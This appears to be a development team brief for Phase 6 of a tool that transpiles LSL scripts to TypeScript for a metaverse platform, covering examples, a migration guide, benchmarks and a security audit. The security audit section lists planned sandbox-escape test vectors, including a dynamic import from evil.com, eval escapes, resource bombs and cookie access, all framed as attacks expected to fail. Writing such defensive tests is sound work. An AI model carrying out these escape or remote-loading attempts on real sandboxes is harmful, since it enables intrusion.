# Scripting Team Brief — Phase 6: Polish & Community

**Date:** 2026-02-20
**Context:** [ADR-003](../adr/ADR-003-phase-6-and-cross-repo-integration.md)

---

## Current State

Phases 1–5 complete. 473 tests, zero failures, zero TypeScript errors.

| Phase | Tests | Status |
|-------|-------|--------|
| 1. Foundation | — | Core types, World API, 179 LSL function mappings |
| 2. Runtime | 72 | Worker pool, SES sandbox, event dispatch, timers, link messages |
| 3. Transpiler | 283 | Lexer, parser, type tracker, function resolver, codegen |
| 4. Editor | — | Monaco + IntelliSense, dual TS/LSL mode, full UI shell |
| 5. Integration | 118 | Protocol types, bundle pipeline, command router, host adapter |

---

## Phase 6 Work Items

### 6A. Example Script Library (P1)

**Target:** 20+ example scripts, organized by category.

| Category | Scripts | Key Patterns |
|----------|---------|--------------|
| **Basics** | Interactive door, elevator, teleporter | Touch → action, state transitions |
| **Communication** | Chat relay, translator, announcement board | Listen/say on channels |
| **Effects** | Fire emitter, water fountain, sparkle trail | Particle config, sound triggers |
| **NPC** | Vendor, greeter, patrol guard | NPC create/move/animate, dialog |
| **Game Mechanics** | Scorekeeper, timer, collectible token | State persistence, scoring |
| **AI-Powered** | Chatbot object, quest giver, tour guide | `world.companion.ask()` |
| **State Machines** | Traffic light, vending machine, quiz board | Multi-state with transitions |
| **Multi-Object** | Drawbridge, conveyor belt, sliding puzzle | Controlling multiple objects |

**Requirements per script:**
- TypeScript source (the primary artifact)
- Equivalent LSL original where applicable (in `lsl-originals/`)
- Inline comments explaining the pattern, not just the code
- Each script must compile and pass type checking
- Each script should be self-contained (no dependencies beyond the engine API)

**File structure:**
```
examples/
  basics/interactive-door.ts
  basics/elevator.ts
  basics/teleporter.ts
  communication/chat-relay.ts
  communication/announcement-board.ts
  effects/fire-emitter.ts
  effects/water-fountain.ts
  effects/sparkle-trail.ts
  npc/vendor.ts
  npc/greeter.ts
  npc/patrol-guard.ts
  game/scorekeeper.ts
  game/collectible-token.ts
  game/timer-game.ts
  ai/chatbot-object.ts
  ai/quest-giver.ts
  ai/tour-guide.ts
  state-machines/traffic-light.ts
  state-machines/vending-machine.ts
  state-machines/quiz-board.ts
  multi-object/drawbridge.ts
  multi-object/conveyor-belt.ts
  multi-object/sliding-puzzle.ts
  lsl-originals/*.lsl
```

**Reference:** [examples/interactive-door.ts](../../examples/interactive-door.ts) is the canonical output format.

### 6B. LSL Migration Guide (P2)

**File:** `docs/lsl-migration-guide.md`

Side-by-side comparison document for LSL veterans. Cover every common pattern:

| Section | LSL Pattern | poqpoq Equivalent |
|---------|-------------|-------------------|
| States | `state X { default { ... } }` | `states = { X: { ... } }` |
| Events | `touch_start(integer n)` | `onTouchStart(agent: Agent)` |
| Say/Listen | `llSay(0, msg)` / `llListen(ch, ...)` | `this.say(0, msg)` / `world.listen(ch, cb)` |
| Timers | `llSetTimerEvent(5.0)` | `this.setTimer(5)` or `this.setTimer(5, "name")` |
| Object Props | `llSetPos(v)` / `llGetPos()` | `this.object.setPosition(v)` / `this.object.getPosition()` |
| HTTP | `llHTTPRequest(url, [...], body)` | `await this.http.get(url)` |
| Sleep | `llSleep(2.0)` (blocking!) | `await this.delay(2)` (non-blocking) |
| Dataserver | `dataserver(key, data)` | `async`/`await` on the original call |
| Detection | `llDetectedName(0)` | `agent.name` (event parameter) |
| Vectors | `vector v = <1,2,3>; v + <4,5,6>` | `new Vector3(1,2,3).add(new Vector3(4,5,6))` |
| Rotations | `rotation r = <0,0,0,1>` | `new Quaternion(0,0,0,1)` |
| Lists | `list l = [1, "a", <1,2,3>]` | `const l: any[] = [1, "a", new Vector3(1,2,3)]` |
| Link Messages | `llMessageLinked(LINK_SET, n, s, k)` | `this.linkMessage(LINK_SET, n, s, k)` |
| Permissions | `llRequestPermissions(id, PERM)` | `await this.requestPermissions(agent, perms)` |
| NPC | `osNpcCreate(name, ...)` | `world.npc.create(name, appearance)` |

**Tone:** Welcoming. "Your LSL knowledge transfers directly. Here's how each pattern maps."

### 6C. Security Audit (P2)

**Directory:** `tests/security/`

Adversarial test scripts that try to escape the SES sandbox:

| Test | Attack Vector | Expected Result |
|------|--------------|-----------------|
| `prototype-pollution.ts` | `Object.prototype.x = 1` | Throws (frozen intrinsics) |
| `eval-escape.ts` | `eval("...")`, `new Function("...")` | Throws (blocked by SES) |
| `memory-bomb.ts` | Infinite array allocation | Terminated by memory limit |
| `cpu-bomb.ts` | `while(true){}` past loop guard | Terminated by iteration limit |
| `worker-escape.ts` | `postMessage` abuse, `self.close()` | Blocked by Worker isolation |
| `cross-script-leak.ts` | Read another script's state | Isolated compartments |
| `dynamic-import.ts` | `import("https://evil.com")` | Blocked by module loader |
| `timing-attack.ts` | `SharedArrayBuffer` side-channel | Not available in compartment |
| `dom-access.ts` | `document.cookie`, `window.fetch` | Not available in Worker |
| `global-mutation.ts` | `globalThis.x = 1` across scripts | Isolated per compartment |

Each test should:
1. Attempt the attack
2. Assert that it fails with an appropriate error
3. Assert that no state leaked to other scripts

### 6D. Performance Benchmarks (P3)

**Directory:** `tests/benchmarks/`

| Benchmark | What It Measures | Target |
|-----------|-----------------|--------|
| `transpiler-throughput.bench.ts` | Batch 60 scripts (virtuallyHuman) | < 2s total |
| `worker-startup.bench.ts` | Time from `new ScriptHostAdapter()` to first script running | < 500ms |
| `event-roundtrip.bench.ts` | Host → script → command → host | < 5ms |
| `memory-per-script.bench.ts` | Baseline memory under SES compartment | < 2MB |
| `bundle-pipeline.bench.ts` | Parse + transpile + load for minimal bundle | < 100ms |

Use Vitest's `bench` mode or manual `performance.now()` timing.

### 6E. Documentation (P3)

- `docs/getting-started.md` — Quick start for new developers
- `docs/api-reference.md` — Generated from TypeScript types (or link to generated docs)
- Update `README.md` — Phase 6 badge, final roadmap status

---

## virtuallyHuman Integration Test (P0)

**This is the most important deliverable.** Run the virtuallyHuman OAR's 60 LSL scripts through our full pipeline:

1. Get bundle export from Legacy team (manifest.json + 60 `.lsl` files)
2. Feed into `BundleParser.parse(manifest)` → `ParsedBundle`
3. Feed into `BundleTranspiler.transpile(bundle, sources)` → `TranspiledBundle`
4. Report: success count, failure count, per-script diagnostics
5. For any failures: identify missing LSL functions, add to transpiler

**Known patterns in virtuallyHuman scripts:**
- `llRequestPermissions` / `PERMISSION_TRIGGER_ANIMATION` — permission system
- `llStartAnimation` / `llStopAnimation` — animation playback
- `llTargetOmega` — continuous rotation (needs mapping if not present)
- `llSetTimerEvent` — timer setup
- Simple `touch_start` handlers

**Test file:** `tests/integration/virtuallyHuman.test.ts`

---

## Repo Identity

**Black Box Scripter** — repo `BlackBoxScripter`, npm `blackbox-scripter`. Part of the Black Box creative suite for the poqpoq open metaverse.

---

## Priority Summary

| Priority | Item | Est. Effort |
|----------|------|-------------|
| **P0** | virtuallyHuman integration test | 1 session |
| **P1** | Example script library (20+ scripts) | 2-3 sessions |
| **P2** | LSL migration guide | 1 session |
| **P2** | Security audit tests | 1 session |
| **P3** | Performance benchmarks | 1 session |
| **P3** | Documentation | 1 session |

---

## Key Files Reference

| Area | File |
|------|------|
| Types | `src/types/` — Vector3, WorldScript, Agent, NPC, etc. |
| API | `src/api/ll-map.ts` — 179 LSL function mappings |
| Runtime | `src/runtime/script-manager.ts` — Worker pool lifecycle |
| Transpiler | `src/transpiler/transpile.ts` — `transpile(source, options)` entry point |
| Integration | `src/integration/` — protocol, bundle, host adapter |
| Editor | `src/editor/` — Monaco + IntelliSense + UI shell |
| Existing examples | `examples/interactive-door.ts` — canonical format |
| Test fixtures | `tests/fixtures/lsl/tier{1,2,3}/` — LSL input fixtures |
| Bundle fixtures | `tests/fixtures/bundles/` — synthetic OAR manifests |
